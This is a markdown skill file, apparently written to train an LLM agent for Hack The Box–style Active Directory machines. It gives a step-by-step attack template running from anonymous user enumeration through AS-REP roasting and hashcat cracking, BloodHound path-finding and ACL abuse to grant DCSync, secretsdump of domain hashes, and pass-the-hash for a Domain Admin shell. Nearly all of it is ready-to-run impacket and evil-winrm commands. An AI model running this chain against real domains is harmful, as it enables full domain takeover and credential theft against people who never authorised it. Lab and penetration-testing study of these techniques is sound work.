# Attack Pattern — AS-REP → BloodHound → DCSync

> The canonical AD chain. Used directly on Forest and Sauna; structurally
> mirrored on a dozen other modern AD boxes.

## Signature

```
anonymous channel (LDAP / RPC / kerbrute) → user list
  → AS-REPRoast → hash → crack → cred
       → BloodHound from authenticated context
            → identify privesc edge (WriteDACL / ACL / direct DCSync rights)
                 → exploit edge
                      → DCSync → Administrator NTLM
                           → pass-the-hash → DA shell
```

## Step-by-step template

### 1. Get a userlist

Choose the cheapest source:
- `rpcclient -U "" -N <ip> -c enumdomusers` (Forest)
- `ldapsearch -x -b "DC=...,DC=..." "(objectClass=user)"`
- `kerbrute userenum --dc <ip> -d <domain> users.txt` (Sauna)

### 2. AS-REPRoast

```bash
impacket-GetNPUsers <dom>/ -usersfile users.txt -no-pass -dc-ip <ip> \
  -format hashcat -outputfile asrep.hashes
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
```

### 3. Validate cred

```bash
crackmapexec smb <ip> -u <user> -p '<pass>'
evil-winrm -i <ip> -u <user> -p '<pass>'
```

### 4. BloodHound from this user

```bash
bloodhound-python -u <user> -p '<pass>' -d <dom> -ns <ip> -c All
```

In BloodHound:
- Mark `<user>` as **Owned**.
- Run "Find Shortest Paths to Domain Admins".
- Run "Find Principals with DCSync Rights on the Domain".

### 5. Exploit the edge

#### If WriteDACL / ACL → DCSync grant
```bash
impacket-dacledit -action write -rights DCSync -principal <user> \
  -target-dn 'DC=...,DC=...' '<dom>/<user>:<pass>'
```

#### If direct DCSync rights
```bash
impacket-secretsdump <dom>/<user>:<pass>@<ip> -just-dc
```

#### If GenericAll on a privileged group
```bash
net rpc group addmem '<group>' '<user>' -U '<dom>/<user>%<pass>' -S <dc>
```

#### If WriteOwner
```powershell
Set-DomainObjectOwner -TargetIdentity <obj> -PrincipalIdentity <user>
# then add ACL as you wish
```

### 6. DCSync

```bash
impacket-secretsdump <dom>/<user>:<pass>@<ip> -just-dc
# capture Administrator hash
```

### 7. PtH

```bash
evil-winrm -i <ip> -u Administrator -H <NTLM>
impacket-psexec -hashes :<NTLM> Administrator@<ip>
```

## Reasoning the LLM should internalise

1. **Always pull the userlist before guessing creds.** A list of 27
   AD users is more valuable than a 14-million-line wordlist.
2. **AS-REP is free** — costs nothing to try, frequently yields hashes.
3. **BloodHound + WinPEAS is the universal post-foothold pair.**
   BloodHound finds graph-based privesc, WinPEAS finds local secrets.
4. **DCSync is the AD endgame.** Recognise the four common ACL paths
   to DCSync: WriteDACL on domain, direct DCSync rights, MemberOf
   privileged group, RBCD / unconstrained delegation.

## Real HTB Examples

- **Forest** — full template, with WriteDACL via Exchange Windows
  Permissions chain.
- **Sauna** — full template, with direct DCSync rights on
  `svc_loanmgr`.
- **Mantis** — variant: AS-REP unavailable; SYSVOL gives password
  instead.
- **Resolute** — variant: cred leaks in user description; chain ends
  in DnsAdmins DLL load.
- **Multimaster** — variant: SQLi for foothold then ACL chain.
- **Cascade** — variant: anon LDAP + custom decrypt; AD recycle bin
  replaces the BloodHound edge step.
- **Sniper, Outdated, Authority, Forge, Pivotapi** — modern AD chains
  with extra primitives but same skeleton.

## Anti-patterns

- Skipping the userlist and brute forcing creds.
- Skipping BloodHound and trying random privesc.
- Brute-forcing ACL discovery via PowerView when BloodHound is
  installed.
- Cracking NTLM hashes when pass-the-hash is free.

## Related Skills

- [`active-directory/as-rep-roasting.md`](../active-directory/as-rep-roasting.md)
- [`active-directory/bloodhound-usage.md`](../active-directory/bloodhound-usage.md)
- [`active-directory/dcsync.md`](../active-directory/dcsync.md)
- [`active-directory/writedacl-abuse.md`](../active-directory/writedacl-abuse.md)
- [`methodology/07-ad-attack-chains.md`](../methodology/07-ad-attack-chains.md)
